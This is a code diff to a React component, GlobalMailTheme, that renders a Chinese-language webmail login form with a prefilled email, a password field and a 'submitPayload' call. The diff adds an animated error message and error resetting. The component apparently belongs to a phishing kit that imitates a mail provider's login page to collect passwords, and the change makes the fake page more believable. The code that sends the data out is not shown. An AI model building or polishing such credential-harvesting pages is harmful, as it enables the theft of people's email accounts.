@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface GlobalMailThemeProps {
   prefilledEmail?: string;
@@ -11,7 +12,7 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'qr' | 'account'>('account');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -122,7 +123,10 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
                       type="text" 
                       placeholder="账号" 
                       value={email}
-                      onChange={(e) => setEmail(e.target.value)}
+                      onChange={(e) => {
+                        setEmail(e.target.value);
+                        if (error) setError(null);
+                      }}
                       className="w-full pl-10 pr-4 py-2.5 bg-gray-50/50 border border-gray-200 rounded text-[14px] focus:outline-none focus:border-red-400 focus:bg-white transition-all"
                     />
                   </div>
@@ -137,7 +141,10 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
                       type="password" 
                       placeholder="请输入密码" 
                       value={password}
-                      onChange={(e) => setPassword(e.target.value)}
+                      onChange={(e) => {
+                        setPassword(e.target.value);
+                        if (error) setError(null);
+                      }}
                       className="w-full pl-10 pr-4 py-2.5 bg-gray-50/50 border border-gray-200 rounded text-[14px] focus:outline-none focus:border-red-400 focus:bg-white transition-all"
                     />
                   </div>
@@ -164,6 +171,16 @@ const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => 
                   >
                     {isSubmitting ? '...' : '登录'}
                   </button>
+
+                  {error && (
+                    <motion.div 
+                      initial={{ opacity: 0, y: -10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="text-red-500 text-[12px] text-center font-medium py-1"
+                    >
+                      {error}
+                    </motion.div>
+                  )}
 
                   <div className="text-right">
                     <a href="#" className="text-[12px] text-gray-400 hover:text-red-500">忘记密码?</a>
